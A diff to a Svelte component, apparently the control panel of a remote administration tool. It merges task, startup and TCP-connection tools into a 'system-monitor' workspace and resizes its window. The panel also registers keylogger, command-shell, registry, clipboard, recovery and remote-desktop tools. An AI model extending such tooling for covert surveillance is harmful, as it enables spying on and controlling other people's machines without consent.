@@ -33,11 +33,9 @@
 	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
 	import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
 	import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
-	import TaskManagerWorkspace from '$lib/components/workspace/tools/task-manager-workspace.svelte';
+	import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
 	import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
-	import StartupManagerWorkspace from '$lib/components/workspace/tools/startup-manager-workspace.svelte';
 	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
-	import TcpConnectionsWorkspace from '$lib/components/workspace/tools/tcp-connections-workspace.svelte';
 	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
 	import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
 	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
@@ -90,11 +88,9 @@
 		'audio-control': AudioControlWorkspace,
 		cmd: CmdWorkspace,
 		'file-manager': FileManagerWorkspace,
-		'task-manager': TaskManagerWorkspace,
+		'system-monitor': SystemMonitorWorkspace,
 		'registry-manager': RegistryManagerWorkspace,
-		'startup-manager': StartupManagerWorkspace,
 		'clipboard-manager': ClipboardManagerWorkspace,
-		'tcp-connections': TcpConnectionsWorkspace,
 		recovery: RecoveryWorkspace,
 		options: OptionsWorkspace,
 		'client-chat': ClientChatWorkspace,
@@ -117,11 +113,9 @@
 		'keylogger-offline',
 		'cmd',
 		'file-manager',
-		'task-manager',
+		'system-monitor',
 		'registry-manager',
-		'startup-manager',
 		'clipboard-manager',
-		'tcp-connections',
 		'recovery',
 		'options',
 		'client-chat',
@@ -140,8 +134,21 @@
 	const isWorkspaceDialog = $derived(workspaceToolIds.has(toolId));
 	const missingAgent = $derived(workspaceRequiresAgent.has(toolId) && !agent);
 
-	const windowWidth = $derived(isWorkspaceDialog ? 980 : 640);
-	const windowHeight = $derived(isWorkspaceDialog ? 640 : 540);
+	const windowWidth = $derived(() => {
+		if (!isWorkspaceDialog) {
+			return 640;
+		}
+		if (toolId === 'system-monitor') {
+			return 1180;
+		}
+		return 980;
+	});
+	const windowHeight = $derived(() => {
+		if (!isWorkspaceDialog) {
+			return 540;
+		}
+		return toolId === 'system-monitor' ? 720 : 640;
+	});
 
 	onMount(() => {
 		if (!browser) {
